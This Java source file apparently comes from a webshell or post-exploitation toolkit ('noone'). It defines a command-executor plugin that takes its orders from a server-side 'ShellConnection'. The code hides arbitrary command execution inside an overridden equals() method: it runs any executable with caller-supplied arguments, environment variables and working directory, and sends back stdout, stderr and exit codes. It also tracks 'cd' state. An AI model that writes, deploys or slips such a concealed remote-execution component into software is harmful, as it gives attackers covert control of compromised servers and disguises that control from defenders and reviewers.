package com.reajason.noone.plugin;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.nio.charset.Charset;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Command executor plugin.
 * This plugin only accepts normalized args from server-side ShellConnection.
 */
public class CommandExecutor {

    public CommandExecutor() {
    }

    @SuppressWarnings("unchecked")
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Map)) {
            return true;
        }
        Map<String, Object> ctx = (Map<String, Object>) obj;
        Map<String, Object> result = new HashMap<String, Object>();
        try {
            String op = asTrimString(ctx.get("op"));
            if (op == null || op.isEmpty()) {
                result.put("error", "op is required");
                ctx.put("result", result);
                return true;
            }

            String cwd = normalizeCwd(asTrimString(ctx.get("cwd")));
            String charsetName = asTrimString(ctx.get("charset"));
            Charset charset = resolveCharset(charsetName);
            result.put("cwd", cwd);
            result.put("charsetUsed", charset.name());

            if ("cd".equals(op)) {
                String cdTarget = asTrimString(ctx.get("cdTarget"));
                String nextCwd = resolveCdTarget(cwd, cdTarget);
                result.put("stdout", "");
                result.put("stderr", "");
                result.put("exitCode", 0);
                result.put("cwd", nextCwd);
                ctx.put("result", result);
                return true;
            }

            if (!"exec".equals(op)) {
                result.put("error", "unsupported op: " + op);
                ctx.put("result", result);
                return true;
            }

            String executable = asTrimString(ctx.get("executable"));
            if (executable == null || executable.isEmpty()) {
                result.put("error", "executable is required");
                ctx.put("result", result);
                return true;
            }

            List<String> command = new ArrayList<String>();
            command.add(executable);
            command.addAll(toStringList(ctx.get("argv")));

            ProcessBuilder pb = new ProcessBuilder(command);
            if (!cwd.isEmpty()) {
                pb.directory(new File(cwd));
            }
            pb.redirectErrorStream(false);
            applyEnv(pb.environment(), ctx.get("env"));

            Process process = pb.start();
            int exitCode = process.waitFor();
            byte[] stdout = readAllBytes(process.getInputStream());
            byte[] stderr = readAllBytes(process.getErrorStream());

            result.put("stdout", new String(stdout, charset));
            result.put("stderr", new String(stderr, charset));
            result.put("exitCode", exitCode);
        } catch (Exception e) {
            result.put("error", "Command execution failed: " + safeMessage(e));
        }
        ctx.put("result", result);
        return true;
    }

    private static void applyEnv(Map<String, String> processEnv, Object rawEnv) {
        if (!(rawEnv instanceof Map)) {
            return;
        }
        Map<?, ?> envMap = (Map<?, ?>) rawEnv;
        for (Map.Entry<?, ?> entry : envMap.entrySet()) {
            if (entry.getKey() == null || entry.getValue() == null) {
                continue;
            }
            String key = asTrimString(entry.getKey());
            if (key == null || key.isEmpty()) {
                continue;
            }
            processEnv.put(key, String.valueOf(entry.getValue()));
        }
    }

    private static List<String> toStringList(Object rawValue) {
        List<String> list = new ArrayList<String>();
        if (rawValue instanceof Iterable<?>) {
            for (Object item : (Iterable<?>) rawValue) {
                if (item != null) {
                    list.add(String.valueOf(item));
                }
            }
        } else if (rawValue != null && rawValue.getClass().isArray()) {
            int length = Array.getLength(rawValue);
            for (int i = 0; i < length; i++) {
                Object item = Array.get(rawValue, i);
                if (item != null) {
                    list.add(String.valueOf(item));
                }
            }
        } else if (rawValue != null) {
            list.add(String.valueOf(rawValue));
        }
        return list;
    }

    private static String resolveCdTarget(String currentCwd, String cdTarget) {
        String target = cdTarget == null ? "~" : stripPairQuote(cdTarget.trim());
        if (target.isEmpty() || "~".equals(target)) {
            return normalizeCwd(System.getProperty("user.home"));
        }
        if (target.startsWith("~/") || target.startsWith("~\\")) {
            target = normalizeCwd(System.getProperty("user.home")) + target.substring(1);
        }

        File targetDir = new File(target);
        if (!targetDir.isAbsolute()) {
            targetDir = new File(currentCwd, target);
        }
        String normalized = normalizePath(targetDir);
        File normalizedDir = new File(normalized);
        if (!normalizedDir.exists()) {
            throw new IllegalArgumentException("Directory does not exist: " + normalized);
        }
        if (!normalizedDir.isDirectory()) {
            throw new IllegalArgumentException("Not a directory: " + normalized);
        }
        return normalized;
    }

    private static String stripPairQuote(String value) {
        if (value == null || value.length() < 2) {
            return value;
        }
        char first = value.charAt(0);
        char last = value.charAt(value.length() - 1);
        if ((first == '"' && last == '"') || (first == '\'' && last == '\'')) {
            return value.substring(1, value.length() - 1);
        }
        return value;
    }

    private static String normalizeCwd(String rawCwd) {
        String cwd = rawCwd;
        if (cwd == null || cwd.isEmpty()) {
            cwd = System.getProperty("user.dir", ".");
        }
        File dir = new File(cwd);
        if (!dir.isAbsolute()) {
            dir = new File(System.getProperty("user.dir", "."), cwd);
        }
        return normalizePath(dir);
    }

    private static String normalizePath(File file) {
        try {
            return file.getCanonicalPath();
        } catch (Exception ignored) {
            return file.getAbsolutePath();
        }
    }

    private static Charset resolveCharset(String charsetName) {
        if (charsetName == null || charsetName.isEmpty()) {
            return Charset.forName("UTF-8");
        }
        try {
            return Charset.forName(charsetName);
        } catch (Exception ignored) {
            return Charset.forName("UTF-8");
        }
    }

    private static byte[] readAllBytes(InputStream inputStream) throws Exception {
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, len);
            }
            return outputStream.toByteArray();
        } finally {
            try {
                inputStream.close();
            } catch (Exception ignored) {
            }
        }
    }

    private static String asTrimString(Object value) {
        if (value == null) {
            return null;
        }
        String text = String.valueOf(value).trim();
        return text.isEmpty() ? null : text;
    }

    private static String safeMessage(Throwable throwable) {
        if (throwable == null) {
            return "unknown error";
        }
        String message = throwable.getMessage();
        if (message == null || message.trim().isEmpty()) {
            return throwable.getClass().getSimpleName();
        }
        return message;
    }
}
